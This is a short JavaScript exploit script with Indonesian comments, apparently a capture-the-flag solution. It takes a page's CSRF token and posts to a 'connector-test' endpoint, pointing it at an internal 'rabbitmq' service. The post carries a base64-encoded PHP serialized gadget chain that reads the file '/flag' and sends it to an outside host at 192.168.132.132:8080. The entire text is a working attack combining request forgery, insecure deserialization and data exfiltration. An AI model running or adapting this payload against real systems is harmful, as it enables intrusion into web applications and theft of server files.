(function() {
    // Ambil CSRF token dan themeId dari window.__BOOTSTRAP__
    const csrf = window.__BOOTSTRAP__.csrfToken;
    const themeId = window.__BOOTSTRAP__.themeId;
    
    // Ganti dengan BASE64 dari langkah 2
    const phpPayloadBase64 = "TzoxMjoiUHJldmlld0JhdGNoIjo0OntzOjU6Iml0ZW1zIjthOjE6e2k6MDtPOjE1OiJQcmV2aWV3RW52ZWxvcGUiOjI6e3M6NjoibGF5b3V0IjtPOjEzOiJTbmlwcGV0TGF5b3V0IjoyOntzOjQ6InZpZXciO086MTI6IlNuYXBzaG90VmlldyI6Mzp7czo3OiJjYXRhbG9nIjtPOjEyOiJBc3NldENhdGFsb2ciOjE6e3M6Njoic3RvcmVzIjthOjE6e2k6MDtPOjE1OiJMb2NhbEFzc2V0U3RvcmUiOjI6e3M6NDoicm9vdCI7czoxOiIvIjtzOjY6InByZWZpeCI7czowOiIiO319fXM6NDoicGF0aCI7czo1OiIvZmxhZyI7czo1OiJmaWVsZCI7czo3OiJjb250ZW50Ijt9czo3OiJ3cmFwcGVyIjtzOjg6Int7Ym9keX19Ijt9czo0OiJtZXRhIjthOjI6e3M6NDoicGF0aCI7czo1OiIvZmxhZyI7czo0OiJzbG90IjtzOjc6InN1bW1hcnkiO319fXM6Nzoiam91cm5hbCI7TzoxNToiRGVsaXZlcnlKb3VybmFsIjozOntzOjY6InRhcmdldCI7TzoxNDoiRGVsaXZlcnlUYXJnZXQiOjM6e3M6NToicmVsYXkiO086MTY6IkludGVncmF0aW9uUmVsYXkiOjQ6e3M6Njoic2NoZW1lIjtzOjQ6Imh0dHAiO3M6NDoiaG9zdCI7czoxNToiMTkyLjE2OC4xMzIuMTMyIjtzOjQ6InBvcnQiO3M6NDoiODA4MCI7czo0OiJwYXRoIjtzOjE6Ii8iO31zOjU6ImZpZWxkIjtzOjQ6ImRhdGEiO3M6MTU6ImV4cGVjdGVkQ2hhbm5lbCI7czo3OiJzdW1tYXJ5Ijt9czo1OiJhcm1lZCI7YjoxO3M6NzoiY2hhbm5lbCI7czo3OiJzdW1tYXJ5Ijt9czo3OiJwcm9maWxlIjthOjI6e3M6NzoiY2hhbm5lbCI7czo3OiJzdW1tYXJ5IjtzOjg6ImNhbGxiYWNrIjtzOjI4OiJodHRwOi8vMTkyLjE2OC4xMzIuMTMyOjgwODAvIjt9czo1OiJzdGF0ZSI7czo2OiJzZWFsZWQiO30="; 
    
    // Kirim ke connector-test
    fetch('/api/reviews/' + themeId + '/connector-test', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            csrf: csrf,
            host: 'rabbitmq',
            port: 5672,
            segments_b64: [phpPayloadBase64]
        })
    }).catch(console.error);
})();
